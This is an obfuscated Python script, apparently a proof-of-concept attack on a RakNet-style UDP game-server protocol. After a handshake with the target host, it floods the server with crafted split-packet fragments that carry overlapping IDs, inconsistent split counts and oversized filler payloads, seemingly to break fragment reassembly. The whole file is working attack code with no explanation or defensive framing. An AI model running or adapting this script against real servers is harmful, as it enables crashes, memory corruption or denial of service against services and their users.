Z=bytearray
V='>H'
Q=len
J=bytes
D=range
import socket as R,struct as E,sys,time,random as O
S=b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x124Vx'
def a(b,GU):
	C=Z();A=0
	def B(v,n):
		nonlocal A
		for F in D(n-1,-1,-1):
			G=A>>3;H=7-(A&7)
			while Q(C)<=G:C.append(0)
			if v>>F&1:C[G]|=1<<H
			else:C[G]&=~(1<<H)
			A+=1
	def F():
		nonlocal A;G=A&7
		if G:A+=8-G
	B(1,1);B(0,1);B(0,1);B(0,1);B(0,1);B(0,1);F()
	for G in E.pack('>Q',GU):B(G,8)
	for G in E.pack('<I',b)[:3]:B(G,8)
	return J(C[:A+7>>3])
def K(r,data,msg,sc=0,sid=0,si=0):
	F=Z();B=0
	def C(v,n):
		nonlocal B
		for E2 in D(n-1,-1,-1):
			A=B>>3;G=7-(B&7)
			while Q(F)<=A:F.append(0)
			if v>>E2&1:F[A]|=1<<G
			else:F[A]&=~(1<<G)
			B+=1
	def G():
		nonlocal B;A=B&7
		if A:B+=8-A
	H=sc>0;C(r,3);C(1 if H else 0,1);G()
	for A in E.pack(V,Q(data)*8):C(A,8)
	if r in(2,3,4):
		for A in E.pack('<I',msg)[:3]:C(A,8)
	G()
	if H:
		for A in E.pack('>I',sc):C(A,8)
		for A in E.pack(V,sid):C(A,8)
		for A in E.pack('>I',si):C(A,8)
	for I in data:C(I,8)
	return J(F[:B+7>>3])
def L(n,GU,*B2):
	A=a(n,GU)
	for C in B2:A+=C
	return A
F,G=sys.argv[1] if Q(sys.argv)>1 else '127.0.0.1',int(sys.argv[2]) if Q(sys.argv)>2 else 53640
B=R.socket(R.AF_INET,R.SOCK_DGRAM)
B.settimeout(3)
GU=O.getrandbits(64)
c=J([0x01])+E.pack('>Q',O.getrandbits(64))+S
B.sendto(c,(F,G))
d,W=B.recvfrom(4096)
f=J([0x09,0x0C])+E.pack('>Q',GU)+S
B.sendto(f,(F,G))
h,W=B.recvfrom(4096)
time.sleep(.15)
C=0;A=0;X=500;P=30;Y=X+P-1;M=20
T=O.randint(8192,12288);U=O.randint(16384,20480)
for N in D(0,80,5):
	H=[]
	for I in D(N,min(N+5,80)):H.append(K(2,b'\xbb'*Y,A,2,T+I,0));A+=1
	B.sendto(L(C,GU,*H),(F,G));C+=1
for N in D(M,M+20,5):
	H=[]
	for I in D(N,min(N+5,M+20)):H.append(K(2,b'\xcc'*Y,A,2,T+I,1));A+=1
	B.sendto(L(C,GU,*H),(F,G));C+=1
for W in D(10):
	U=O.randint(16384,20480);H=[K(2,b'A'*X,A,P,U,0)];A+=1
	for I in D(1,P):H.append(K(2,b'B',A,P,U,I));A+=1
	B.sendto(L(C,GU,*H),(F,G));C+=1
	for I in D(M+20,M+30):B.sendto(L(C,GU,K(2,b'\xdd'*529,A,2,T+I,1)),(F,G));C+=1;A+=1
	for g in[64,128,256,512,529,1024,529,256,128,64,529,529,529,529,529,256,128,64,32,16]:B.sendto(L(C,GU,K(2,b'\xee'*g,A)),(F,G));C+=1;A+=1
print('done')
